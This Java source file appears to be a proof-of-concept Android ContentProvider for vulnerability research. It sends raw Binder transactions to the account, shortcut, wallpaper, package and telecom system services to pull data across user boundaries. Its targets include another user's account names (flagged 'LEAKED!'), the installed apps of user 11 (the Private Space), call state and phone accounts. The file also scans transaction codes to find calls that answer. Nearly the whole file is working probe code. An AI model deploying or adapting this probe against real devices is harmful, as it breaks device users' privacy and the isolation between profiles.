package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class AccountShortcutProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("account")) {
            probeAccountManager(cursor);
        } else if (path != null && path.contains("shortcut")) {
            probeShortcutService(cursor);
        } else if (path != null && path.contains("wallpaper")) {
            probeWallpaper(cursor);
        } else if (path != null && path.contains("package")) {
            probePackageManager(cursor);
        } else if (path != null && path.contains("telecom")) {
            probeTelecom(cursor);
        } else {
            probeAccountManager(cursor);
            probeShortcutService(cursor);
            probePackageManager(cursor);
            probeTelecom(cursor);
        }

        return cursor;
    }

    private void probeAccountManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("account");
        if (binder == null) { cursor.addRow(new Object[]{"account", "no_binder"}); return; }
        String desc = "android.accounts.IAccountManager";

        // TX=6: getAccountsAsUser(String accountType, int userId, String opPackageName)
        // accountType=null means ALL types
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(null); // null = all account types
                data.writeInt(userId);
                data.writeString(getContext().getPackageName());
                binder.transact(6, data, reply, 0);
                reply.readException();
                // Account[] via createTypedArray
                int count = reply.readInt();
                cursor.addRow(new Object[]{"accts_u" + userId, "count=" + count});
                if (count > 0 && count < 100) {
                    for (int i = 0; i < Math.min(count, 10); i++) {
                        if (reply.readInt() != 0) {
                            String name = reply.readString();
                            String type = reply.readString();
                            cursor.addRow(new Object[]{"acct_u" + userId + "_" + i,
                                type + ": " + name});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"accts_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=6 with specific types
        String[] types = {"com.google", "com.google.android.legacycontacts"};
        for (String type : types) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(type);
                data.writeInt(0); // user 0
                data.writeString(getContext().getPackageName());
                binder.transact(6, data, reply, 0);
                reply.readException();
                int count = reply.readInt();
                if (count > 0 && count < 100) {
                    cursor.addRow(new Object[]{"acctType_" + type.replace("com.", ""), "LEAKED! count=" + count});
                    for (int i = 0; i < Math.min(count, 5); i++) {
                        if (reply.readInt() != 0) {
                            String name = reply.readString();
                            String t = reply.readString();
                            cursor.addRow(new Object[]{"acctT_" + i, t + ": " + name});
                        }
                    }
                } else {
                    cursor.addRow(new Object[]{"acctType_" + type.replace("com.", ""), "count=" + count});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"acctType_" + type.replace("com.", ""), "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=4: getAccountsForPackage(String packageName, int uid, String opPkg)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString("com.google.android.gms");
            data.writeInt(10107); // guess GMS uid from DeviceIdle leak
            data.writeString(getContext().getPackageName());
            binder.transact(4, data, reply, 0);
            reply.readException();
            int count = reply.readInt();
            cursor.addRow(new Object[]{"accts4_gms", "count=" + count});
            if (count > 0 && count < 100) {
                for (int i = 0; i < Math.min(count, 5); i++) {
                    if (reply.readInt() != 0) {
                        String name = reply.readString();
                        String type = reply.readString();
                        cursor.addRow(new Object[]{"accts4_" + i, type + ": " + name});
                    }
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"accts4_gms", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private void probeShortcutService(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("shortcut");
        if (binder == null) { cursor.addRow(new Object[]{"shortcut", "no_binder"}); return; }
        String desc = "android.content.pm.IShortcutService";

        // IShortcutService methods:
        // TX=1: setDynamicShortcuts(...)
        // TX=5: getMaxShortcutCountPerActivity(String packageName, int userId)
        // TX=13: getShortcuts(String packageName, int matchFlags, int userId)
        // TX=16: hasShortcutHostPermission(String callingPackage, int userId)
        // TX=17: isRateLimitingActive(String callingPackage, int userId)

        // TX=5: getMaxShortcutCountPerActivity — lightweight probe
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeInt(0);
            binder.transact(5, data, reply, 0);
            reply.readException();
            int max = reply.readInt();
            cursor.addRow(new Object[]{"maxShortcuts", String.valueOf(max)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"maxShortcuts", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=16: hasShortcutHostPermission
        for (int userId : new int[]{0, 11}) {
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(userId);
                binder.transact(16, data, reply, 0);
                reply.readException();
                boolean has = reply.readInt() != 0;
                cursor.addRow(new Object[]{"hostPerm_u" + userId, String.valueOf(has)});
            } catch (Exception e) {
                cursor.addRow(new Object[]{"hostPerm_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // Try TX scan
        for (int tx = 1; tx <= 20; tx++) {
            if (tx == 5 || tx == 16) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"sc_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"sc_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        // format error, skip
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeWallpaper(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("wallpaper");
        if (binder == null) { cursor.addRow(new Object[]{"wallpaper", "no_binder"}); return; }
        String desc = "android.app.IWallpaperManager";

        // IWallpaperManager:
        // TX=3: getWallpaper(String callingPackage, IWallpaperManagerCallback, int which,
        //        Bundle outParams, int wallpaperId, int userId)
        // TX=10: getWallpaperInfo(int userId, int displayId)
        // TX=13: isWallpaperSupported(String callingPackage)
        // TX=19: getWallpaperColors(int which, int userId, int displayId)

        // TX=10: getWallpaperInfo — reveals wallpaper component (app info) per user
        for (int userId : new int[]{0, 11}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeInt(userId);
                data.writeInt(0); // displayId
                binder.transact(10, data, reply, 0);
                reply.readException();
                if (reply.readInt() != 0) { // non-null WallpaperInfo
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"wpInfo_u" + userId, "HAS_DATA avail=" + avail});
                } else {
                    cursor.addRow(new Object[]{"wpInfo_u" + userId, "null(static wallpaper)"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"wpInfo_u" + userId, "ERR:" + truncate(e.getMessage())});
            }
            data.recycle();
            reply.recycle();
        }

        // TX=19: getWallpaperColors — reveals wallpaper characteristics per user
        for (int userId : new int[]{0, 11}) {
            for (int which : new int[]{1, 2}) { // FLAG_SYSTEM=1, FLAG_LOCK=2
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(desc);
                    data.writeInt(which);
                    data.writeInt(userId);
                    data.writeInt(0); // displayId
                    binder.transact(19, data, reply, 0);
                    reply.readException();
                    if (reply.readInt() != 0) { // non-null WallpaperColors
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"wpColors_u" + userId + "_w" + which,
                            "HAS_COLORS! avail=" + avail});
                        // Try reading primary color
                        try {
                            int colorInt = reply.readInt();
                            cursor.addRow(new Object[]{"wpColor_u" + userId, "primary=0x" + Integer.toHexString(colorInt)});
                        } catch (Exception ignored) {}
                    } else {
                        cursor.addRow(new Object[]{"wpColors_u" + userId + "_w" + which, "null"});
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"wpColors_u" + userId + "_w" + which, "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void probePackageManager(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("package");
        if (binder == null) { cursor.addRow(new Object[]{"package", "no_binder"}); return; }
        String desc = "android.content.pm.IPackageManager";

        // getInstalledPackages(long flags, int userId) — can we list Private Space packages?
        // This is a massive TX code space; the TX varies by Android version
        // Let's try a targeted approach: query specific packages for user 11

        // isPackageAvailable(String packageName, int userId)
        // TX code varies — let's try common ones
        String[] targets = {"com.google.android.apps.messaging", "com.google.android.dialer",
            "com.google.android.gms", "com.android.chrome", "com.whatsapp"};

        // First find the TX code for isPackageAvailable by scanning
        // Actually let's use reflection on the system PackageManager
        try {
            android.content.pm.PackageManager pm = getContext().getPackageManager();
            // getInstalledApplications with MATCH_UNINSTALLED flag
            java.util.List<android.content.pm.ApplicationInfo> apps =
                pm.getInstalledApplications(0);
            cursor.addRow(new Object[]{"installedApps_u0", "count=" + (apps != null ? apps.size() : 0)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"installedApps", "ERR:" + truncate(e.getMessage())});
        }

        // Try getPackageUid for other users — information disclosure
        for (String pkg : targets) {
            try {
                // Use hidden API: PackageManager.getPackageUidAsUser
                Method m = getContext().getPackageManager().getClass().getMethod(
                    "getPackageUidAsUser", String.class, int.class);
                int uid = (int) m.invoke(getContext().getPackageManager(), pkg, 11);
                cursor.addRow(new Object[]{"uid_u11_" + pkg.substring(pkg.lastIndexOf('.')+1), String.valueOf(uid)});
            } catch (Exception e) {
                String msg = e.getMessage();
                if (msg != null && msg.contains("NameNotFoundException")) {
                    cursor.addRow(new Object[]{"uid_u11_" + pkg.substring(pkg.lastIndexOf('.')+1), "NOT_INSTALLED_U11"});
                } else {
                    cursor.addRow(new Object[]{"uid_u11_" + pkg.substring(pkg.lastIndexOf('.')+1), "ERR:" + truncate(msg)});
                }
            }
        }

        // Try direct binder call for getInstalledPackages(flags, userId)
        // In Android 16, typically TX around 50-70
        // Let's use getPackagesForUid which is simpler
        // Actually, try a targeted TX: isPackageAvailable(String pkg, int userId)
        // Let's scan some TX codes to find working ones
        for (int tx : new int[]{48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58}) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString("com.google.android.gms");
                data.writeInt(11); // user 11
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"pm_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"pm_tx" + tx, "SEC"});
                    } catch (Exception e) {
                        // parse error
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeTelecom(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("telecom");
        if (binder == null) { cursor.addRow(new Object[]{"telecom", "no_binder"}); return; }
        String desc = "com.android.internal.telecom.ITelecomService";

        // ITelecomService interesting methods:
        // TX=7: getCallCapablePhoneAccounts(boolean includeDisabledAccounts, String callingPackage, String callingFeatureId)
        // TX=8: getSelfManagedPhoneAccounts(...)
        // TX=10: getPhoneAccountsSupportingScheme(String scheme, ...)
        // TX=18: isInCall(String callingPackage, String callingFeatureId)
        // TX=19: isInManagedCall(...)
        // TX=21: getCallState()
        // TX=56: getCurrentTtyMode(String callingPackage, String callingFeatureId)

        // TX=21: getCallState — reveals if user is on a call (no permission needed?)
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            binder.transact(21, data, reply, 0);
            reply.readException();
            int state = reply.readInt();
            // 0=IDLE, 1=RINGING, 2=OFFHOOK
            String[] states = {"IDLE", "RINGING", "OFFHOOK"};
            cursor.addRow(new Object[]{"callState", state < 3 ? states[state] : "UNKNOWN(" + state + ")"});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"callState", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=18: isInCall
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            binder.transact(18, data, reply, 0);
            reply.readException();
            boolean inCall = reply.readInt() != 0;
            cursor.addRow(new Object[]{"isInCall", String.valueOf(inCall)});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"isInCall", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=7: getCallCapablePhoneAccounts
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeInt(0); // includeDisabled = false
            data.writeString(getContext().getPackageName());
            data.writeString(null);
            binder.transact(7, data, reply, 0);
            reply.readException();
            int count = reply.readInt();
            cursor.addRow(new Object[]{"phoneAccounts", "count=" + count});
            if (count > 0 && count < 20) {
                for (int i = 0; i < Math.min(count, 5); i++) {
                    if (reply.readInt() != 0) {
                        // PhoneAccountHandle parcelable
                        int avail = reply.dataAvail();
                        try {
                            // ComponentName
                            String pkg = reply.readString();
                            String cls = reply.readString();
                            String id = reply.readString();
                            cursor.addRow(new Object[]{"phone_" + i, pkg + "/" + cls + " id=" + id});
                        } catch (Exception ignored) {}
                    }
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"phoneAccounts", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
